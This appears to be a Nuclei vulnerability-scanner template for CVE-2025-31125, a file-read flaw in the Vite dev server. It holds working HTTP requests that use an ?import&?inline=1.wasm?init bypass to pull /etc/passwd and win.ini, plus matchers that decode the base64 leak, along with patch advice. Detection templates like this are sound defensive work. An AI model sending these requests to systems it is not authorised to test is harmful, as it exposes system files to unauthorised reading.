id: CVE-2025-31125
info:
  name: Vite Any File Read Vulnerability
  author: martian
  severity: medium
  description: |
    Vite is a frontend tooling framework for javascript. Vite exposes content of non-allowed files using ?inline&import or ?raw?import. Only apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected. This vulnerability is fixed in 6.2.4, 6.1.3, 6.0.13, 5.4.16, and 4.5.11.
  remediation: |
    Vite has released security patches for versions 6.2.4, 6.1.3, 6.0.13, 5.4.16, and 4.5.11. Please update vite via npm as soon as possible or manually upgrade to the above versions to fix the vulnerabilities.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-31125
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2025-31125
    cwe-id: CWE-284
  metadata: 
    verified: true
    fofa-query: body="/@vite/client"
  tags: vite,fileread,cve,cve2025,arbitrary-file-read,CVE-2025-31125


http:
  - raw:
      - |
        GET /etc/passwd?import&?inline=1.wasm?init HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*

      - |
        GET /C://windows/win.ini?import&?inline=1.wasm?init HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*


    extractors:
      - type: regex
        name: base64_content
        part: body
        group: 1
        internal: true
        regex:
         - 'data:(?:text/plain|application/octet-stream);base64,([A-Za-z0-9+/=]+)'


    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "contains(base64_decode(base64_content), '; for 16-bit app support') && contains(base64_decode(base64_content), '[fonts]') && contains(base64_decode(base64_content), '[extensions]') && contains(base64_decode(base64_content), '[files]')"
      
      - type: dsl
        dsl:
          - "contains(base64_decode(base64_content), 'root:x:0:') && contains(base64_decode(base64_content), '/sbin/nologin') && contains(base64_decode(base64_content), '/bin:')"

